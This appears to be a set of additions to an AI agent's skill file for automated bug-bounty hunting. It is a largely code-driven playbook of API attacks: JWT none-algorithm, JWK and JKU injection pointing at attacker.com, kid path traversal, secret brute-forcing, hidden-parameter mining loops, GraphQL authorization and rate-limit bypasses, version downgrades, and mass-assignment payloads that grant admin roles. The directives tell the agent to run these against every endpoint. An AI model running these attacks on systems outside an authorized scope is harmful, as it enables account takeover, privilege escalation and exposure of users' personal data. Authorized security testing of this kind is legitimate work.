# ApiSecurity Upgrades for BugBountyHunter

These are additions made to the `ApiSecurity/SKILL.md` skill file to support the BugBountyHunter system. If you have the `ai-security-arsenal` installed, apply these sections to your existing `ApiSecurity/SKILL.md`.

## What Was Changed

1. **Expanded JWT attack section** with JWK injection, kid path traversal, JKU/X5U injection, algorithm confusion
2. **Added parameter mining section** with Arjun-style hidden parameter brute-forcing
3. **Added GraphQL field-level authorization testing** beyond just introspection
4. **Added API version downgrade attacks** (/v3 --> /v2 --> /v1)
5. **Added mass assignment detection** via response diff analysis

## Sections to Add

### 1. Extended JWT Attacks (add to or replace existing JWT section)

```markdown
### Advanced JWT Attacks

Beyond basic JWT testing, perform these attacks on every JWT-authenticated endpoint:

**None Algorithm Variants:**
```bash
# Decode JWT, change alg to none, remove signature
# Try all case variants: none, None, NONE, nOnE
echo '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# Concatenate with dot and empty signature: HEADER.PAYLOAD.
```

**JWK Injection:**
1. Generate RSA key pair: `openssl genrsa -out attacker.pem 2048`
2. Extract public key as JWK
3. Embed JWK in JWT header: `{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}`
4. Sign JWT with attacker's private key
5. Server may trust the embedded JWK instead of its own key store

**kid Path Traversal:**
```json
{"alg":"HS256","kid":"../../dev/null"}
```
Sign with empty string -- `/dev/null` returns empty content, HMAC of empty key may match.

Other kid values to try:
- `../../proc/sys/kernel/hostname`
- `../../etc/hostname`
- `/dev/null`
- `../../../dev/null`

**JKU/X5U Injection:**
```json
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
```
1. Host a JWKS endpoint on your server with your public key
2. Set `jku` (JSON Web Key Set URL) to point to your server
3. Server fetches keys from your URL and trusts them
4. Same technique works with `x5u` (X.509 URL)

**Algorithm Confusion (RS256 to HS256):**
1. Obtain server's RSA public key (from `/jwks.json`, `/.well-known/openid-configuration`, or certificate)
2. Change JWT `alg` from `RS256` to `HS256`
3. Sign the JWT using the RSA public key as the HMAC secret
4. Server may use the public key for HMAC verification

**Weak Secret Brute-Force:**
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt

# Using jwt_tool
jwt_tool TOKEN -C -d /path/to/wordlist.txt

# Common JWT secrets to try first:
# secret, password, 123456, your-256-bit-secret, jwt_secret
```

**Automated Full Test:**
```bash
jwt_tool -t https://target.com/api/endpoint -rc "Authorization: Bearer TOKEN" -M at
```
```

### 2. Parameter Mining / Hidden Parameter Discovery (add as new section)

```markdown
### Parameter Discovery (Hidden Parameter Mining)

For every discovered API endpoint, attempt to find hidden parameters that aren't documented:

**Arjun-style brute-force approach:**
```bash
# If arjun is installed:
arjun -u https://target.com/api/endpoint -m GET
arjun -u https://target.com/api/endpoint -m POST

# curl-based approach (no extra tools needed):
BASELINE=$(curl -s "https://target.com/api/endpoint" | md5sum | cut -d' ' -f1)
for param in debug test admin internal verbose trace _method callback format fields include expand select filter sort order limit offset page per_page token key api_key apikey secret access_token auth version v id user_id role is_admin plan type status; do
  RESPONSE=$(curl -s "https://target.com/api/endpoint?$param=true" | md5sum | cut -d' ' -f1)
  if [ "$RESPONSE" != "$BASELINE" ]; then
    echo "[DIFF] Parameter '$param' changes response"
  fi
done
```

**High-value parameters to check:**
- Debug/test: `debug`, `test`, `verbose`, `trace`, `development`, `staging`
- Admin: `admin`, `is_admin`, `role`, `permissions`, `internal`
- Format: `format`, `output`, `callback`, `jsonp`, `_method`
- Expansion: `fields`, `include`, `expand`, `select`, `embed`, `relations`
- Auth: `token`, `key`, `api_key`, `apikey`, `secret`, `access_token`

**JSON body parameter mining (for POST/PUT endpoints):**
1. Send a GET request to the same resource to see all available fields
2. Add each field to your POST/PUT body
3. Check if additional fields like `role`, `is_admin`, `verified`, `plan` are accepted
```

### 3. GraphQL Field-Level Authorization Testing (expand existing GraphQL section)

```markdown
### GraphQL Field-Level Authorization Testing

After obtaining the schema via introspection, test authorization at every level:

**Step 1: Identify sensitive fields in the schema:**
```graphql
# Look for fields that should be role-restricted:
# - email, phone, address, SSN, payment info
# - admin flags, roles, permissions
# - internal IDs, API keys, tokens
# - private messages, health data
```

**Step 2: Test access with different auth levels:**
```graphql
# As unauthenticated user:
query { user(id: "TARGET_ID") { email phone address paymentMethod { last4 } } }

# As low-privilege user:
query { user(id: "ADMIN_ID") { role permissions isAdmin internalNotes } }
```

**Step 3: Alias-based batching for rate limit bypass:**
```graphql
# Send multiple queries in one request using aliases:
query {
  a: user(id: "1") { email }
  b: user(id: "2") { email }
  c: user(id: "3") { email }
  # ... up to hundreds of aliases
}
```
This bypasses per-request rate limits since it is technically one request.

**Step 4: Nested query authorization bypass:**
```graphql
# If you can access a parent object, check if children have their own auth:
query {
  organization(id: "ORG_ID") {
    users {          # Are all users returned, or just your team?
      email
      role
      apiKeys {      # Can you access other users' API keys?
        key
        secret
      }
    }
    billing {        # Is billing info restricted?
      plan
      cardLast4
    }
  }
}
```

**Step 5: Subscription abuse:**
```graphql
# Subscribe to events you shouldn't have access to:
subscription {
  orderUpdated(organizationId: "OTHER_ORG") {
    orderId
    customerEmail
    totalAmount
  }
}
```
```

### 4. API Version Downgrade Attacks (add as new section)

```markdown
### API Version Downgrade Attacks

Older API versions often lack authorization middleware, input validation, or rate limiting added in newer versions.

**For each endpoint, test version downgrade:**
```bash
# Original endpoint
curl https://target.com/api/v3/users/123

# Try older versions
curl https://target.com/api/v2/users/123
curl https://target.com/api/v1/users/123
curl https://target.com/api/v0/users/123

# Try without version prefix
curl https://target.com/api/users/123
curl https://target.com/users/123

# Try version in header instead of path
curl -H "Api-Version: 1" https://target.com/api/users/123
curl -H "Accept: application/vnd.target.v1+json" https://target.com/api/users/123
```

**What to look for:**
- Older version returns data that newer version restricts
- Older version lacks authentication on endpoints that require it in newer version
- Older version returns more fields in response (additional PII, internal data)
- Older version accepts parameters that newer version rejects (mass assignment)
- Older version has different rate limits or no rate limits
```

### 5. Mass Assignment Detection via Response Diff (add as new section)

```markdown
### Mass Assignment Detection

For each POST/PUT/PATCH endpoint, test if you can assign fields beyond what the client normally sends:

**Technique:**
1. **GET the resource** to see all available fields:
   ```bash
   curl https://target.com/api/user/me
   # Response: {"id":1,"name":"user","email":"user@test.com","role":"user","plan":"free","is_admin":false}
   ```

2. **PUT/PATCH with extra fields** from the GET response:
   ```bash
   curl -X PUT https://target.com/api/user/me \
     -H "Content-Type: application/json" \
     -d '{"name":"user","role":"admin","is_admin":true,"plan":"enterprise"}'
   ```

3. **Check the response** -- did the server accept the extra fields?
   ```bash
   curl https://target.com/api/user/me
   # If role changed to admin --> mass assignment vulnerability
   ```

**High-value fields to inject:**
- `role`, `is_admin`, `admin`, `superuser`, `permissions`
- `plan`, `tier`, `subscription`, `premium`
- `verified`, `email_verified`, `approved`, `active`
- `balance`, `credits`, `points`
- `organization_id`, `tenant_id` (cross-tenant escalation)

**Also test with nested objects:**
```json
{"user": {"role": "admin"}, "settings": {"is_admin": true}}
```
```
